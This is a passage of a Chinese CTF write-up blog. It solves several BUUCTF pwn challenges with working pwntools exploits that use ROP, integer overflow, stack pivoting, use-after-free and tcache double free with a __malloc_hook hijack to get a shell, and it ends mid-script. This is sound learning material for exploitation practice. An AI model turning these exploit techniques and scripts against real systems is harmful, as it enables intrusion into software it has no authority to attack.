<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090610.png"></p>
<p>师傅们都是泄露出puts的got表地址，去查询出libc版本然后下载，然而我很惊奇的发现，我泄露的地址查询不到对应的libc版本。。。所以这里的exceve函数地址我是直接把师傅们的搬运过来了0x4526a</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090158.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090211.png"></p>
<p>以及，栈迁移的发送函数，只能选择send。（别问为什么，我选择的是sendline。。。一直出问题，甚至为了找问题，我每个与师傅们wp不同地方慢慢改，发现竟然是这个原因，只能怪自己粗心吧，猜测是这里的read读取过于严格，所有输入数据都是刚好，多输入了一个\n导致了问题的发生，下次一定注意！）还有就是距离重要数据太近这点，前面的ret执行多次就是为了避免这个，因为bss段距离.got.plt太近了，并且跳转回main函数的时候，还会进行一次巨大的升栈，所以的话执行多次ret把栈的位置往bss段的高地址处迁移</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408091459.png"></p>
<p>其他的话，wp如下：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408092959.png"></p>
<h3 id="十二、bjdctf-2020-babyrop"><a href="#十二、bjdctf-2020-babyrop" class="headerlink" title="十二、bjdctf_2020_babyrop"></a>十二、bjdctf_2020_babyrop</h3><p>例行checksec一下，然后运行一下。开启了nx和部分relro缓解机制。运行的结果也不能看出些什么，进入ida看看吧</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155229.png"></p>
<p>在一个函数里面有着很明显的溢出点，足够我们覆盖返回地址并且构造系统函数了。一道常规的rop，就不多说了，已经做烂了。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155615.png"></p>
<p>exp如下：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408170004.png"></p>
<h3 id="十三、others-shellcode"><a href="#十三、others-shellcode" class="headerlink" title="十三、others_shellcode"></a>十三、others_shellcode</h3><p>例行checksec以及执行附件，开启了nx，pie以及部分relro。运行附件发现直接就获取了shell。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073535.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073615.png"></p>
<p>然后我试着nc一下远程，看看是不是也能获取shell，没想到。。确实可以</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073831.png"></p>
<p>查看ida，发现附件中是已经调用了execve函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410074925.png"></p>
<h3 id="十四、pwn2-sctf-2016"><a href="#十四、pwn2-sctf-2016" class="headerlink" title="十四、pwn2_sctf_2016"></a>十四、pwn2_sctf_2016</h3><p>例行checksec并且运行，只开启nx和部分的relro，拖入ida查看一下代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202516.png"></p>
<p>程序比较简单，可以很明确的发现，不存在后门函数，也没有明显的溢出点，被限制了。printf也没有问题，对于这样的情况，我第一时间是想到了整数溢出，通过整数溢出来越过检查，通过小数变成大数，从而溢出。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202734.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418205625.png"></p>
<p>接下来讲下漏洞点：main函数里面定义的v2是int类型的，而在get_n里面却是unsigned的，这里如果我们输入了一个负数，那么在get_n里面将变得非常大，足够我们溢出了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210123.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210150.png"></p>
<p>但是没有后门函数，所以只能进行rop了，用printf函数泄露got表地址，LibcSearcher一下，最终构造sys函数获取shell。网上师傅们都取了格式化参数，其实没必要的，本身printf存在着格式化字符串漏洞，所以可以直接printf出来，没必要再输入一个格式化参数。这里有个坑的地方，好吧，是我傻得踩到了还一直没看出来。get_n里面的getchar里面已经对0截断了，所以在第二次构造payload的时候，不可以像往常那样顺手写个p32(0)，后面感觉不对劲，我给他顺手改成了个p32(1)。。。。有点傻。。这个后面三个字节仍然是0，依旧截断了。写出来警示一下大伙，多注意点细节。</p>
<p>对了，libc找出来有15个，你可以知道我有多绝望了，一个个试了，竟然都不行，而且还是两遍！！！</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25066</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br>p.recvline() <span class="hljs-comment">#接收最后的printf，让程序流执行完</span><br>printf_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf address:&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)<br>libc_base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(system)+<span class="hljs-string">&#x27;beef&#x27;</span>+p32(binsh) <span class="hljs-comment">#beef！！！！！</span><br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十五、ciscn-2019-s-3"><a href="#十五、ciscn-2019-s-3" class="headerlink" title="十五、ciscn_2019_s_3"></a>十五、ciscn_2019_s_3</h3><p>常规执行checksec一下，查看保护，并且执行一下程序，看看回显</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210425202117.png"></p>
<p>出现了一堆乱码，可能是地址泄露了？进入ida看看情况如何</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123130.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123138.png"></p>
<p>main函数里面很简单，两个系统调用就没了，而有系统调用，那就去看看汇编代码。汇编代码前两行要注意，这里的rsp没有减少，在这题里面rsp=rbp了，后面计算偏移不可以把rbp覆盖了。左边的函数栏看一下，有个gadget的，进入查看</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123625.png"></p>
<p>很显然，这里面给出了两个调用号，0F和3BH，对应着这题两种解法，我们先介绍使用3BH调用号调用execve函数的解法，稍后再介绍另一种。</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>execve(“/bin/sh”,0,0)总共有三个参数，所以我们需要控制rdi,rsi,rdx三个寄存器的值，很显然，这是return to libc_csu_init。rsi和rdx的值很好控制，设置为0即可，而/bin/sh字符串则需要我们去寻找了，我们只有一个输入点，就是往栈上面输入/bin/sh，然后通过泄露栈的地址而得到该地址，从而把地址给rdi，最后再调用syscall函数，即可获取shell。</p>
<p>而write函数会输出栈上0x30个内存单元内容，通过调试，可以知道0x20位置处会泄露出一个栈上的地址，我们只需要计算该地址到/bin/sh的偏差，就可以获取/bin/sh的地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124551.png"></p>
<p>上图是我在本地调试的情况，0x7ffcaba65838是泄露出来的地址，可是扣去0x7ffcaba656f0得到的却是0x148，而我去网上找师傅们的wp是0x138，不太懂为什么。所以我只能本地获取到了shell，但是远程不能过了。</p>
<p>获取到了/bin/sh的地址，后面就是构造rop链了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124941.png"></p>
<p>这边csu里面的edi是有问题的，因为/bin/sh的地址是不止4个字节，所以edi是不够盛放的，所以我们需要rdi才行，这边使用了ROPgadget去寻找。所以后面payload构造rop时，这边还需要利用r12盛放栈上的内容进行跳转到栈上继续执行，而不能直接就在r12里面存放syscall地址进行直接调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,25007)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="hljs-number">0x40059a</span><br>rdx_edi_rsi=<span class="hljs-number">0x400580</span><br>offset=<span class="hljs-number">0x138</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(main)<br>p.send(payload)<br>p.recv(<span class="hljs-number">0x20</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br>binsh=leak-offset<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(leak)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(binsh)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *main&#x27;</span>)<br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span><br>payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdx_edi_rsi)+p64(execve)  <span class="hljs-comment">#p64(execve)在栈上距离/bin/sh有0x50的长度</span><br>payload+=p64(pop_rdi)+p64(binsh)+p64(syscall)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>后面有缘再更新吧，，，，</p>
<h3 id="十六、ciscn-2019-es-2"><a href="#十六、ciscn-2019-es-2" class="headerlink" title="十六、ciscn_2019_es_2"></a>十六、ciscn_2019_es_2</h3><p>常规checksec查看保护措施</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105608.png"></p>
<p>程序只开启了NX，应该是道较为简单的题目，进入ida看看情况</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105715.png"></p>
<p>这里总共输入了两次数据，同时还能printf出来，可能会泄露一些重要地址信息。这里的read函数全部被限制到只够刚好覆盖到返回地址就不能再继续填充了，所以这里是用了栈迁移的思想，把栈迁移到栈上，制造一个假栈。</p>
<p>栈迁移利用leave 和ret指令改变ebp和esp的指向位置，所以要先得到要迁移的地址，也就是s位置，这边泄露ebp的值，从而计算两者偏差</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501110624.png"></p>
<p>最顶上0xfffcd65就是s的位置，而0xffcd678就是ebp指向的位置，而在该地址处的内容为0xfffcd688就是我们泄露出来的内容，与s偏差为0x38</p>
<p>而系统函数附件中已经有了system的调用，差的就只有/bin/sh的字符串了，我们可以直接写在栈上，然后仍然是用泄露出来的地址算出/bin/sh地址，作为参数即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27262</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>p.recvline()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+<span class="hljs-string">&#x27;dead&#x27;</span>+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十七、ciscn-2019-n-3"><a href="#十七、ciscn-2019-n-3" class="headerlink" title="十七、ciscn_2019_n_3"></a>十七、ciscn_2019_n_3</h3><p>照例checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505110425-1620522753562.png"></p>
<p>开启了nx和canary，relro只开启部分，可以修改got表（后面没用到就是了）</p>
<p>进入ida看看反汇编代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505110633-1620522770994.png"></p>
<p>总共有着四个功能，第一个new note：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505110745.png"></p>
<p>在第一个功能里面，可以创建一个堆，堆里面第一个存放的是printf函数指针，第二存放了一个free函数指针，第三个存放有区别，当type==1，存放的是一个数据，type ==2，存放的是字符串的地址。然后这个字符串的真正位置存放在又生成的一个堆里面。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505111350.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505111403.png"></p>
<p>free函数里面并未将指针置空，存在uaf漏洞。</p>
<p>另外三个功能，一个是调用printf函数指针，打印出一串字符串，一个是调用free函数指针，还有一个就是打印没什么意义的字符串</p>
<p>在函数表里面，我们可以看见，system函数被调用过了，也就是接下来就是/bin/sh以及调用的问题，这里我们选择在函数指针做手脚，因为函数指针未置空，我们只需要把free函数指针改为指向system的地址，然后再对释放的内容修改为/bin/sh的地址，就能让调用free(ptr)变成system(“/bin/sh”)，这边由于输入长度问题，写的是/sh字符串。</p>
<p>那该怎么修改呢？利用fastbin attack，首先创建两个chunk（type==2的，chunk0和chunk1）创建的chunk都是固定大小为0xc的chunk，后面我们能控制大小的chunk随便写一个大小即可（不能为0xc！其他都行）。然后释放掉这两个chunk，再申请一个chunk3，我们能控制大小的chunk也要设置大小也为0xc，由于LIFO，那么程序创建的chunk将会被分配到第二个被释放的chunk1的位置，我们能控制大小的chunk就会被分配到第一个释放的chunk0的位置，而我们又能对这个chunk进行输入，所以把”sh\x00\x00”+p32(system)输入即可，最后再释放掉调用函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505112805.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,27753)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx,num,size,value</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Type &gt;&quot;</span>,<span class="hljs-built_in">str</span>(num))<br>	<span class="hljs-keyword">if</span> num==<span class="hljs-number">1</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<span class="hljs-keyword">else</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Length &gt;&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">purchase</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">&quot;sh\x00\x00&quot;</span>+p32(system))<br>gdb.attach(p,<span class="hljs-string">&#x27;b*main&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)   <span class="hljs-comment">#uaf</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十八、ciscn-2019-final-3"><a href="#十八、ciscn-2019-final-3" class="headerlink" title="十八、ciscn_2019_final_3"></a>十八、ciscn_2019_final_3</h3><p>常规checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505113309.png"></p>
<p>保护全开了，拖进ida看看反汇编代码吧</p>
<img src="/2021/04/07/2021-04-07-buu03/QQ图片20210505202136.png">

<p>c++代码写的，不过功能很简单，就两个选择，先看第一个吧</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505202251.png"></p>
<p>最多可以创建二十四个不同的索引，堆的大小最大不能超过0x78，被限制只有fast chunk大小，然后我们在创建之后还能往堆上输入数据，最后，printf了堆的地址出来。</p>
<p>第二个功能更简单</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505202536.png"></p>
<p>释放掉索引对应的堆块，并且可以发现，并未将堆指针置空，存在uaf漏洞。在找找其他地方，发现没有存在后门函数。那只能走泄露libc了，然后劫持hook函数。</p>
<p>要泄露libc，就要有被释放的unsorted bin，这里限制了chunk的大小，那我们就要去修改chunk size，将其修改为比0x410大的数，因为题目环境为libc-2.27.so，存在tcache。</p>
<p>先创建许多堆块（后面再解释为什么创建这么多个），然后释放同一个堆块，因为存在tcache，所以可以直接释放两次</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505203105.png"></p>
<p>出现了循环指向，这时候我们在申请同样大小的堆块，这里是要申请三次，第三次chunk生成的地方（选择生成在chunk0的size处，修改他的值），才是我们要的。首先是指向自身，当我们第一次申请时，通过输入把fd修改为指向chunk0</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505203355.png"></p>
<p>这是第一次申请，可以看到，chunk0地址出现了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505203604.png"></p>
<p>这是第二次申请，只剩下chunk0，那第三次申请就能让chunk出现在chunk0位置，然后修改其size的大小，这边我是修改为0x420</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505203733.png"></p>
<p>然后把这个堆块释放掉，就会出现libc了，这边解释为什么要申请很多的堆块，因为你要修改为0x420，如果申请的堆块没有大于0x420，那这个堆块会一直处于free的状态的，他要有那么大的size，才能成为0x420的chunk，所以我们申请的堆块会先被并入这个大chunk里面。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505204038.png"></p>
<p>释放完后出现了libc中的地址，接下来就泄露了。因为题目里面只能泄露出堆块的地址，所以我们要想办法让在这个地址申请chunk。这边因为这个0x420的chunk是由许多chunk合并的，我们把chunk1释放了，再申请一个大小和chunk0一样的堆块，就可以让chunk1能够重叠在fd的位置</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210505204421.png"></p>
<p>可以看到，0x20大小的tcache_entry出现了类似前面的重复释放的样式，所以也是申请堆块，然后在libc地址生成chunk，再将其泄露。之后就是劫持hook了，以上的就是这题的点了，后面不多说了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25609</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,write</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;something&quot;</span>,write)<br>	p.recvuntil(<span class="hljs-string">&quot;gift :&quot;</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>ptr0=add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ptr0)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#4</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#5 </span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#6</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#7 </span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#9 </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#10</span><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#11</span><br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#12</span><br><br>remove(<span class="hljs-number">12</span>)<br>remove(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>))<br>remove(<span class="hljs-number">0</span>)<br>remove(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>libc_base=add(<span class="hljs-number">18</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)-<span class="hljs-number">0x3ebca0</span><br>__malloc_hook=libc_base+__malloc_hook<br>one_gadget=libc_base+<span class="hljs-number">0x10a38c</span><br>log.info(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>log.info(<span class="hljs-string">&quot;__malloc_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(__malloc_hook))<br>log.info(<span class="hljs-string">&quot;one_gadget: &quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br>remove(<span class="hljs-number">3</span>)<br>remove(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x70</span>,p64(one_gadget))<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b*main&#x27;)</span><br>p.sendlineafter(<span 